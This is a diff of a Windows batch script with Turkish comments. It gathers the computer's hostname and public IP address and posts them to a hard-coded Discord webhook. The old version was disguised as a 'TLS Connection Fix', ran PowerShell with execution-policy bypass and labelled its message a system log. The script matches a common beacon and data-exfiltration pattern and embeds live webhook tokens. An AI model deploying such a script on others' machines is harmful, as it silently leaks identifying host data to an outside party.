@@ -1,13 +1,16 @@
 @echo off
-title TLS Connection Fix
+title Discord Connection Test
 chcp 65001 >nul
 
-set "URL=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"
+set "WEBHOOK=https://discord.com/api/webhooks/1514159972081074298/mKZ8mYuuUM_c_PN77hBGFX1AhfesXzh7NSi4XTaKkFfM0UlIdw3HSbAJjbqxLepeAdqa"
 
-for /f "tokens=*" %%a in ('hostname') do set "H=%%a"
+:: Bilgileri Topla
+for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
+for /f "tokens=*" %%b in ('curl -s https://api.ipify.org') do set "IP=%%b"
 
-:: Güvenlik protokolünü TLS 1.2'ye zorlayarak gönderme
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $json = @{content='[SYSTEM LOG] Host: %H% | Durum: Baglanti Aktif'}; Invoke-RestMethod -Uri '%URL%' -Method Post -Body ($json | ConvertTo-Json) -ContentType 'application/json'"
+:: JSON Gönderimi (Kaçış karakterleri optimize edildi)
+curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"**✅ Baglanti Basarili!**\\n**Bilgisayar:** %HOST%\\n**IP Adresi:** %IP%\"}" "%WEBHOOK%"
 
-echo Islem tamamlandi, ag yaniti bekleniyor...
+echo.
+echo Islem tamamlandi. Discord kanalini kontrol et.
 pause
